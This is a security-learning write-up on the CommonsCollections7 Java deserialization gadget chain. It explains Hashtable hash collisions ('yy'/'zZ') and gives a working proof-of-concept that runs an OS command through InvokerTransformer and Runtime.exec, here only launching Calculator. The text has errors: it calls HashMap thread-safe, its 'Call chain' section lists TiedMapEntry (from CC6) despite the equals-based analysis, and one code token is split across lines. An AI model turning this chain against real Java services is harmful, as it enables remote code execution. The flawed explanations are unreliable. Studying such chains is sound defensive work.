# Java Security Learning-Commons-Collections7 Chain

Author: H3rmesk1t

#Environmental construction
> 1. `JDK` version: JDK1.8u66
> 2. `Commons-Collections` version: 3.1

> Use `maven` to build it. First create a `Maven` project without selecting any `Maven` template. The content in `pom.xml` is as follows. Then select the update on the right and let it automatically import the package.

```xml
<?xml version="1.0" encoding="UTF-8"?>
<project xmlns="http://maven.apache.org/POM/4.0.0"
         xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
         xsi:schemaLocation="http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd">
    <modelVersion>4.0.0</modelVersion>

    <groupId>org.example</groupId>
    <artifactId>commons-collections</artifactId>
    <version>1.0-SNAPSHOT</version>

    <dependencies>
        <dependency>
            <groupId>commons-collections</groupId>
            <artifactId>commons-collections</artifactId>
            <version>3.1</version>
        </dependency>
    </dependencies>

</project>
```

# Pre-knowledge
## Hashtable
> `Hashtable` is similar to `HashMap`, both are a hash table in the form of `key-value`

```java
[1] Hashtable thread-safe, HashMap thread-safe
[2] HashMap inherits AbstractMap, while Hashtable inherits Dictionary
[3] Both basically use the "array-linked list" structure, but HashMap introduces the implementation of red and black trees
[4] Hashtable's key-value is not allowed to be a null value, but HashMap is allowed, which will place the entity with key=null at index=0
```

> Follow up on `Hashtable` and found that in the `readObject` method, the `reconstitutionPut()` method will be called, and `key.hashCode()` method will be called in the `reconstitutionPut()` method. The subsequent calling logic is basically the same as the `CommonsCollections6` chain.

<img src="./images/23.png" alt="">

## Hash Collision Mechanism
> The statement given on [ProgrammerSought](https://www.programmersought.com/article/94401321514/) is

```
The so-called hash conflict, that is, the two key values ​​​​​are calculated by the hash function to obtain the same hash value, and a subscript can only store one key, which produces a hash conflict, if the subscript one of the keys first Saved, the other key must find its own storage location by other means.
```
> That is to say, when two different `keys` calculate the same `hash` value through the `hash()` method, and one subscript can only store one `key`, which creates a `hash` conflict

> So how to construct a `hash` conflict? Follow up on the `HashMap#hash` method

<img src="./images/27.png" alt="">

> Continue to follow up on the `hashcode()` method. According to the code in the `for` loop, it is not difficult to deduce the calculation formula for the `Hash` value.

<img src="./images/28.png" alt="">

<img src="./images/29.png" alt="">

> It is not difficult to explain why the `yy` and `zZ` chain in the `ysoserial` project is `yy` and `zZ`. When needed, use `z3` to calculate the possible values ​​when the number of string bits is different.

```python
ord("y") == 121
ord("z") == 122
ord("Z") == 90
"yy".hashCode() == 31 × 121 + 1 × 121 == 3872
"zZ".hashCode() == 31 × 122 + 1 × 90 == 3872
"yy".hashCode() == "zZ".hashCode() == 3872
```


# CommonsCollections7 Analysis
> In the `CommonsCollections` chain, use `AbstractMap#equals` to trigger the call to the `LazyMap#get` method. If the `m` is controllable, then set `m` to `LazyMap` to complete the subsequent chain construction.

<img src="./images/24.png" alt="">

> Continue to follow up and see where the call point of the `equals` method is. There is a call point in the `Hashtable#reconstitutionPut` method in the previous `Hashtable#reconstitutionPut` method: `e.key.equals(key)`. If the `key` here is controllable, the `m` above is controllable.

> Observe that the `key` passed in in the `readObject` method, correspondingly, then the value entered by `Hashtable#put` will also exist at the `writeObject`

<img src="./images/25.png" alt="">

> There is another point that needs to be noted here. Since the `if` statement uses `&&` connection to determine the condition, to execute the subsequent `e.key.equals(key)`, you must first satisfy `e.hash == hash`, and then call the `equals` method. Here we use the `Hash` conflict (`Hash` collision) mechanism

<img src="./images/26.png" alt="">

> Remove the element in the second LazyMap in `POC` because the get` method adds a new element to the current `map2` becomes two elements

<img src="./images/31.png" alt="">

## POC

```java
package CommonsCollections7;

import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.LazyMap;

import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.ObjectInputStream;
import java.io.ObjectOutputStream;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Hashtable;
import java.util.Map;

/**
 * @Author: H3rmesk1t
 * @Data: 2021/11/30 6:40 pm
 */
public class CommonsCollections7Gadget {

    public static void CC7() throws NoSuchFieldException, IllegalAccessException {
        Transformer[] faketransformer = new Transformer[]{};
        Transformer[] transformers = new Transformer[] {
                new ConstantTransformer(Runtime.class),
                ne
w InvokerTransformer("getMethod", new Class[]{String.class, Class[].class}, new Object[]{"getRuntime", null}),
                new InvokerTransformer("invoke", new Class[]{Object.class, Object[].class}, new Object[]{null, null}),
                new InvokerTransformer("exec", new Class[]{String.class}, new Object[]{"open -a /System/Applications/Calculator.app"})
        };
        ChainedTransformer chainedTransformer = new ChainedTransformer(faketransformer);

        Map hashMap1 = new HashMap();
        Map hashMap2 = new HashMap();

        Map map1 = LazyMap.decorate(hashMap1, chainedTransformer);
        map1.put("yy", 1);
        Map map2 = LazyMap.decorate(hashMap2, chainedTransformer);
        map2.put("zZ", 1);

        Hashtable hashtable = new Hashtable();
        hashtable.put(map1, 1);
        hashtable.put(map2, 1);
        Class _class = chainedTransformer.getClass();
        Field field = _class.getDeclaredField("iTransformers");
        field.setAccessible(true);
        field.set(chainedTransformer, transformers);
        map2.remove("yy");

        try {
            ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
            ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream);
            objectOutputStream.writeObject(hashtable);
            objectOutputStream.close();

            ByteArrayInputStream byteArrayInputStream = new ByteArrayInputStream(byteArrayOutputStream.toByteArray());
            ObjectInputStream objectInputStream = new ObjectInputStream(byteArrayInputStream);
            objectInputStream.readObject();
            objectInputStream.close();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void main(String[] args) {
        try {
            CC7();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```
<img src="./images/30.png" alt="">

# Call chain

```java
Hashtable.readObject()
   TiedMapEntry.hashCode()
        LazyMap.get()
            ChainedTransformer.transform()
                ConstantTransformer.transform()
                    InvokerTransformer.transform()
```

# Summarize
> The main idea is to use `Hashtable` instead of `HashMap` to trigger `LazyMap`, and the subsequent utilization is basically the same as the `HashMap` utilization method of `CommonsCollections6` chain.